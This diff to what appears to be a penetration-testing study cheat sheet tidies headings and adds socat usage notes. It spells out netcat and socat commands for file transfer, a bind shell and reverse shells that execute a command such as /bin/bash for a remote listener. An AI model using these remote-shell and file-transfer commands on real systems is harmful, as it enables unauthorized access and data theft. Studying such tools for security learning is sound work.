@@ -399,7 +399,7 @@ $nc -n [netcat Server machine IP address] [port]
 the port is the server spacified port number 
 
 
-NetCat file transfare:
+### NetCat file transfare:
 
 server side (reciver):
 
@@ -413,7 +413,7 @@ client side (sender):
 $nc -n [serverIP] [server port] < [path of the file to be send]
 ```
 
-NetCat Remote Execution:
+### NetCat Remote Execution:
 
 **forword command execution(Bind Shell)**
 
@@ -429,7 +429,7 @@ clinet side:
 $nc -n [serverIP] [serve rport]
 ```
 
-**revirce shell**
+**reverse shell**
 
 server side:
 
@@ -441,6 +441,43 @@ clinet side:
 ```
 nc -n *serverIP* *serverPort* -e *full path of command to be executed*
 ```
+## socat
+
+socat can be used for bidirectnal communication between sender and reciver
+
+Server side:
+```
+$ socat - tcp4-LISTEN:[listning port number]
+```
+Client side:
+```
+$ socat - tcp4:[server ip address]:[server listning port number]
+```
+### socat file transfare:
+Sender side:
+```
+$ socat tcp4-LISTEN:[listning port number],fork file:[the file to be send]
+```
+Reciever side:
+```
+$ socat tcp4:[sender ip address]:[sender port] file:[the file name to be saved],create
+```
+
+### socat reverse shell
+
+Listner side:
+```
+socat -d tcp4-LISTNE:[listning port number] STDOUT
+```
+-d for verbos mode
+STDOUT to direct the output to the Standard Output
+
+Server side:
+```
+socat tcp4:[listnet ip address]:[listner port] EXEC:[command path]
+```
+command path could be /bin/bash
+
 # Reconnaissance:
 
 ## Pasive Reconnaissance:
